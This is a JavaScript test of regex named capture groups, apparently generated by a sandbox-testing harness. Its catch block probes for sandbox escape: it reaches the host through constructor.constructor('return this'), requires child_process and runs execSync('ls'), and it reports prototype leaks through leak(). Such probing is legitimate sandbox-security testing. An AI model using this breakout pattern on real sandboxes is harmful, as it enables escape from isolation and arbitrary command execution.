try {
    assert.sameValue('a', /(?<π>a)/.exec('bab').groups.π);
    assert.sameValue('a', /(?<π>a)/.exec('bab').groups.π);
    assert.sameValue('a', /(?<$>a)/.exec('bab').groups.$);
    assert.sameValue('a', /(?<_>a)/.exec('bab').groups._);
    assert.sameValue('a', /(?<_\u200C>a)/.exec('bab').groups._‌);
    assert.sameValue('a', /(?<_\u200D>a)/.exec('bab').groups._‍);
    assert.sameValue('a', /(?<ಠ_ಠ>a)/.exec('bab').groups.ಠ_ಠ);
    assert(/(?<\u0041>.)/.test('a'));
    assert(RegExp('(?<A>.)').test('a'), 'Non-surrogate');
    assert(RegExp('(?<\\u0041>.)').test('a'), 'Non-surrogate');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}